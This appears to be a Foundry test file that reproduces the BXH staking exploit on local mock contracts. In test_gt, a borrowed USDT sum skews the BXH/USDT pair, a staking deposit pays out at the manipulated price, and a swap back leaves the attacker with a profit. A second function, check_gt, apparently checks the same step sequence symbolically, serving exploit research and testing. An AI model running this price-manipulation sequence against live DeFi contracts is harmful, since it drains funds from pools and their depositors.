// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./AttackContract.sol";
import "./BXH.sol";
import "./BXHStaking.sol";
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {USDT} from "@utils/USDT.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract BXHTest is Test, BlockLoader {
    BXH bxh;
    USDT usdt;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    BXHStaking bxhstaking;
    AttackContract attackContract;
    address owner;
    address attacker;
    address bxhAddr;
    address usdtAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address bxhstakingAddr;
    address attackContractAddr;
    uint256 blockTimestamp = 1664374995;
    uint112 reserve0pair = 25147468936549224419158;
    uint112 reserve1pair = 150042582869434191452532;
    uint32 blockTimestampLastpair = 1664360756;
    uint256 kLastpair = 3772859961506335396254991567849051167345332565;
    uint256 price0CumulativeLastpair =
        1658542015723059495128658895585784161862152;
    uint256 price1CumulativeLastpair =
        32126006449291447357830235525583796774104;
    uint256 totalSupplybxh = 124962294544563937586572816;
    uint256 balanceOfbxhpair = 150042582869434191452532;
    uint256 balanceOfbxhattacker = 0;
    uint256 balanceOfbxhbxhstaking = 0;
    uint256 totalSupplyusdt = 4979997922170098408283526080;
    uint256 balanceOfusdtpair = 25147468936549224419158;
    uint256 balanceOfusdtattacker = 0;
    uint256 balanceOfusdtbxhstaking = 40030764994324038311630;

    function setUp() public {
        owner = address(this);
        bxh = new BXH();
        bxhAddr = address(bxh);
        usdt = new USDT();
        usdtAddr = address(usdt);
        pair = new UniswapV2Pair(
            address(usdt),
            address(bxh),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        bxhstaking = new BXHStaking(
            address(bxh),
            1 ether,
            block.timestamp,
            1000,
            owner,
            address(usdt),
            address(pair)
        );
        bxhstakingAddr = address(bxhstaking);
        attackContract = new AttackContract();
        attackContractAddr = address(attackContract);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        usdt.transfer(address(pair), balanceOfusdtpair);
        bxh.transfer(address(pair), balanceOfbxhpair);
        usdt.transfer(address(bxhstaking), balanceOfusdtbxhstaking);
        bxh.transfer(address(bxhstaking), 200000 ether);
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Bxh Balances: ");
        queryERC20BalanceDecimals(address(usdt), address(bxh), usdt.decimals());
        queryERC20BalanceDecimals(address(bxh), address(bxh), bxh.decimals());
        emit log_string("");
        emit log_string("Usdt Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(usdt),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(address(bxh), address(usdt), bxh.decimals());
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(pair),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(address(bxh), address(pair), bxh.decimals());
        emit log_string("");
        emit log_string("Bxhstaking Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(bxhstaking),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(bxh),
            address(bxhstaking),
            bxh.decimals()
        );
        emit log_string("");
        emit log_string("Attackcontract Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(attackContract),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(bxh),
            address(attackContract),
            bxh.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker;
    }

    function nop(uint256 amount) internal pure {
        return;
    }

    function borrow_owner_usdt(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(owner);
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_owner_usdt(uint256 amount) internal {
        usdt.transfer(owner, amount);
    }

    function borrow_owner_bxh(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(owner);
        bxh.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_owner_bxh(uint256 amount) internal {
        bxh.transfer(owner, amount);
    }

    function borrow_pair_usdt(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(address(pair));
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_pair_usdt(uint256 amount) internal {
        usdt.transfer(address(pair), amount);
    }

    function borrow_pair_bxh(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(address(pair));
        bxh.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_pair_bxh(uint256 amount) internal {
        bxh.transfer(address(pair), amount);
    }

    function swap_pair_usdt_bxh(uint256 amount) internal {
        usdt.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(usdt);
        path[1] = address(bxh);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function swap_pair_bxh_usdt(uint256 amount) internal {
        bxh.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(bxh);
        path[1] = address(usdt);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function sync_pair() internal {
        pair.sync();
    }

    function transaction_bxhstaking_bxh(uint256 amount) internal {
        bxhstaking.deposit(0, amount);
    }

    function test_gt() public {
        vm.startPrank(attacker);
        borrow_owner_usdt(3110000e18);
        printBalance("After step0 ");
        swap_pair_usdt_bxh(usdt.balanceOf(attacker));
        printBalance("After step1 ");
        transaction_bxhstaking_bxh(0);
        printBalance("After step2 ");
        swap_pair_bxh_usdt(bxh.balanceOf(attacker));
        printBalance("After step3 ");
        payback_owner_usdt((3110000e18 * 1003) / 1000);
        printBalance("After step4 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_usdt_bxh(amt1);
        transaction_bxhstaking_bxh(amt2);
        swap_pair_bxh_usdt(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
